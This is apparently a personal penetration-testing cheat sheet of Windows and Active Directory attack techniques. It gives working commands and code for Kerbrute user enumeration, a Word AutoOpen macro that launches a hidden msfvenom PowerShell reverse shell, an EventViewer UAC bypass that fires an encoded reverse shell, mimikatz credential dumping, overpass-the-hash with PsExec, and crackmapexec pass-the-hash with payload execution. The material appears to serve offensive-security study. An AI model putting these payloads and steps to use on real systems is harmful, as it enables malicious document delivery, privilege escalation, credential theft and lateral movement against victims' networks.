[[#Word Macro]]

[[#UAC Bypass]] - Escalate

[[#Dumping Hashes]] - Escalate

[[#OverPassTheHash]] - Lateral

[[#Pass the hash]] - Lateral

[[#Kerbrute Users]] - AD Enumeration

# Kerbrute Users
Brute-force user names.
```bash
kerbrute userenum --dc 10.11.1.120 -d xor.com /usr/share/seclists/Usernames/userlist.txt | tee brute-users.txt
```

Deduplicate and sort
```bash
cat brute-users.txt | cut -d ' ' -f 8 | tr '[:upper:]' '[:lower:]' | sort -u > users.txt
```

# Office Macro - Word/Excel
Create a macro
```vbascript
Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
Dim Str As String

<paste_payload_here>

CreateObject("Wscript.Shell").Run Str
End Sub

```

Generate msfvenom reverse shell payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f hta-psh
```

split the payload (VBA has a char limit per line)
```python2.7
str = "powershell.exe -nop -w hidden -e <encoded payload from msfvenom command>"

n = 50

for i in range(0, len(str), n):
        print "Str = Str + " + '"' + str[i:i+n]+'"'
```

#### example final macro:
```vbascript
Sub AutoOpen()
MyMacro
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub MyMacro()
Dim Str As String

Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
..
..
Str = Str + "uAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzA"
Str = Str + "CkAOwA="

CreateObject("Wscript.Shell").Run Str
End Sub

```

# UAC Bypass
Increase integrtiy level without alerting the user.

![[Pasted image 20220504173921.png]]
1. Get [EventViewer bypass - PS1](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1)
1. [[Data Sharing#Python3 webserver]] to windows
1. Generate [[#Reverse encoded Powershell]]
1. Listen to the port on kali
1. Fire
```powershell
Invoke-EventVwrBypass -Command "<encoded reverse shell>"
```

Or try the standalone:
[EventViewer bypass - C](https://github.com/turbo/zero2hero)

# Reverse encoded Powershell
Generate [encoded powershell reverse shell](https://www.revshells.com/)


# Dumping Hashes
[[Data Sharing#Python3 webserver]] to get `mimikatz.exe`
```cmd
mimikatz.exe
```

```mimikatz
privilege::debug
```

```mimikatz
sekurlsa::logonpasswords
```


# OverPassTheHash
get NTML hashes by [[#Dumping Hashes]] 

Start a process as another user
```mimikatz
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell.exe
```

authenticate to another service as the user to create `TGS` and `TGT`
```powershell
net use \\dc01
```

view ticket (optional)
```powershell
klist
```

RCE with [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
```powershell
.\PsExec.exe \\dc01 cmd.exe -accepteula
```

# Pass the hash
[[#Dumping Hashes]]

Test
```bash
crackmapexec smb <ip> -u administrator -H <hash> -d local
```

- Generate [[#Reverse encoded Powershell]]
- Start a listener

Get a shell
```bash
crackmapexec smb <ip> -u administrator -H <hash> -d local -X "<payload>"
```


